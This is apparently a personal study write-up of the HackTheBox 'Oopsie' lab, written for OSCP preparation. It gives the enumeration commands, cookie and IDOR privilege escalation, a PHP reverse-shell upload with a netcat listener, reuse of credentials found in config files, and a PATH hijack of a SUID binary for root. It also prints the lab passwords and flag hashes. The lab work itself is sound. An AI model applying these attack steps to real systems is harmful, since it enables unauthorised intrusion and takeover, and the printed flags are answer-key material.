---

---

# Oopsie
---
## Getting Started
---
Use command to set Target IP
```bash
IP='10.129.15.4' ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP
```

Ping Target IP
```bash
ping $IP
```

---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sC -sV $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 17:05 EDT
Nmap scan report for 10.129.254.195
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```

---
### WEBSITE ENUM
---
Navigated to the website and noticed that there was mention of a login but no links worked.

>![[Pasted image 20220926180856.png]]



---
####  Burp Suite ENUM
---
Used Burp suite to enumerate further. Followed [Burp Suite How-To](obsidian://open?vault=OSCP&file=TOOLS%2FBurp%20Suite%2FHow-to)  to configure Firefox 

Results
>Identified Hidden Directory /cdn-cgi/login in Burp Suite under  the Target tab and then on the Sitemap option
>       ![[Pasted image 20220926175937.png]]

---
#### Investigate Login
---
Navigated to Domain and found login page with ability to create Guest Account
>![[Pasted image 20220926181742.png]]

Logged in as guest and identified a Uploads TAB. Navigated to tab and returned 

>![[Pasted image 20220926181959.png]]
---
#### Website User Privec
---
Attempted to find a way to escalate our privileges from user Guest to super admin role.
Inspected the page and went to Storage 
>![[Pasted image 20220926182529.png]]

Navigated to Account tab and noticed url
>http://10.129.254.195/cdn-cgi/login/admin.php?content=accounts&id=2

Modified id=2 to id=1 and navigated to URL. 
Returned 
>![[Pasted image 20220926182908.png]]

Modified Cookie to user value to be 34322 and role value to be admin .
>![[Pasted image 20220926183130.png]]

Navigated to Uploads Tab successfully.

Website is using **PHP**.

---
## Foothold
---
#### Gobuster ENUM
---
Use go buster to enumerate to find where the uploads are stored

```bash
gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php 
```

results
```
``===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.15.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/27 06:27:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.129.15.4/images/]
/index.php            (Status: 200) [Size: 10932]                               
/themes               (Status: 301) [Size: 311] [--> http://10.129.15.4/themes/]
/uploads              (Status: 301) [Size: 312] [--> http://10.129.15.4/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.129.15.4/css/]    
/js                   (Status: 301) [Size: 307] [--> http://10.129.15.4/js/]     
/fonts                (Status: 301) [Size: 310] [--> http://10.129.15.4/fonts/]
```

---
#### Continue Foothold
---
Upload file /home/kali/OSCP/HackTheBox/StatingPoint/Oopsie/webshells-master/php-reverse-shell.php  to uploads Tab

Establish netcat listener
```bash
nc -lvnp 1234
```

create url
```bash
echo http://$IP/uploads/php-reverse-shell.php | copy
```

Navigate to url in browser.

Netcat Connection and reverse shell. Improve shell with command
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---
## Lateral Movement
---
After some search we can find some interesting php files under /var/www/html/cdn-  
cgi/login directory.

seems to be a password.php in dir

search all files for passw
```bash
cat * | grep -i passw*
```

output
```
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />

```

look at /etc/host to see if password is reused

```bash
cat /etc/passwd
```

found admin user

```
robert:x:1000:1000:robert:/home/robert:/bin/bash
```

attempted to login in as robert using found password

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: MEGACORP_4dm1n!!

su: Authentication failure

```

Failed to loggin

continue to explore .php files. View db.php

```bash
cat db.php
```

Results

```
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Attempt to login with robert with new password M3g4C0rpUs3r!

```
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ cd /home/  
cd /home/
robert@oopsie:/home$ ls
ls
robert
robert@oopsie:/home$ cd robert
cd robert
robert@oopsie:~$ ls
ls
user.txt
robert@oopsie:~$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```
---
## Privilege Escalation
---
Check for root

Results
```
robert@oopsie:~$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
```

user can not execute sudo

Check Groups

```
robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Investigate bugtracker group for binary

```bash
find / -group bugtracker 2>/dev/null
```

Result
```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

```

Check privileges and file type
```bash
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

Result
```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped

```

setuid is a suid
>Commonly noted as SUID (Set owner User ID), the special permission for the user access  level has a single function: A file with SUID always executes as the user who owns the  file, regardless of the user passing the command. If the file owner doesn't have  execute permissions, then use an uppercase S here

Run bugtracker
```
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory
```

tool atempts to cat a file. Create an alternate cat in /tmp containing /bin/bash and then change priv

```bash
cd /tmp

echo /bin/bash > cat

chmod +x cat
```

In order to exploit this we can add the /tmp directory to the PATH environmental variable.

```bash
export PATH=/tmp:$PATH

```
check
```bash
echo $PATH
```

Run bugtracker from /tmp give imput and check user.

```
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

root@oopsie:/tmp# whoami
whoami
root

```

because the program set uid to root were able to leverage the binary to get a shell
```
root@oopsie:/# cd /root
cd /root
root@oopsie:/root# ls
ls
reports  root.txt
root@oopsie:/root# cat root.txt 
cat root.txt
root@oopsie:/root# echo root.txt
echo root.txt
root.txt
root@oopsie:/root# less root.txt
less root.txt
WARNING: terminal is not fully functional
root.txt  (press RETURN)
af13b0bee69f8a877c3faf667f7beacf
root.txt (END)

```
cat would not work but I used less to read the contents

---
## Flags
---
user.text
```bash
f2c74ee8db7983851ab2a96a44eb7981
```

root.txt
```
af13b0bee69f8a877c3faf667f7beacf
```
---
## Tags
---
#burpsuit #cookie #php-reverse-shell #php #suid








